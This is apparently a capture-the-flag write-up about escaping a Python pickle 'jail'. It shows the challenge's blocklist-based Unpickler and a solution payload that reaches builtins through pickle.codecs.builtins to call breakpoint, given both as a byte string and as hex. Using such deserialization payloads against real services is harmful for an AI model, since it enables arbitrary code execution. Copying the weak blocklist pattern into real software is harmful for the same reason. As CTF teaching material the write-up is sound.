# breaking in the jail

## challenge

```py
import pickle
from io import BytesIO

class SecureUnpicklerFor1337Haxx0rsOnly(pickle.Unpickler):
    def find_class(self, module: str, name: str) -> object:
        if module != '__main__':
            return "1m4o n0p3"

        if any(x in name for x in ['ex', 'ev', 'system', 'break', 'help', 'load', 'npickle']):
            return "t00 d4ng3r0u5"

        return super().find_class(module, name)

if __name__ == '__main__':
    data = bytes.fromhex(input('$ '))
    SecureUnpicklerFor1337Haxx0rsOnly(BytesIO(data)).load()
```

## solution

intended solution (from A~Z): `b'\x80\4c__main__\npickle.codecs.builtins.getattr\nc__main__\npickle.codecs.builtins\nVbreakpoint\n\x86R)R.'`

the pickle module is imported, so we can use that from `__main__`

the pickle module has dependencies, and these are attributes of the pickle module. if you are curious, the dependency tree is
`{'_compat_pickle': {}, 'codecs': {'builtins': {}, 'sys': {}}, 'io': {'_io': {}, 'abc': {}}, 're': {'_locale': {}, 'copyreg': {}, 'enum': {'sys': {}}, 'functools': {}, 'sre_compile': {'_sre': {}, 'sre_parse': {}}, 'sre_parse': {}}, 'sys': {}}`

we can get to builtins by using codecs, so `pickle.codecs.builtins`. we can use the getattr from builtins to get breakpoint.

```
>>> from pickle import *
>>> (PROTO + b'\x04' + GLOBAL + b'__main__\npickle.codecs.builtins.getattr\n' + GLOBAL + b'__main__\npickle.codecs.builtins\n' + UNICODE + b'breakpoint\n' + TUPLE2 + REDUCE + EMPTY_TUPLE + REDUCE).hex()
'8004635f5f6d61696e5f5f0a7069636b6c652e636f646563732e6275696c74696e732e676574617474720a635f5f6d61696e5f5f0a7069636b6c652e636f646563732e6275696c74696e730a56627265616b706f696e740a86522952'
```
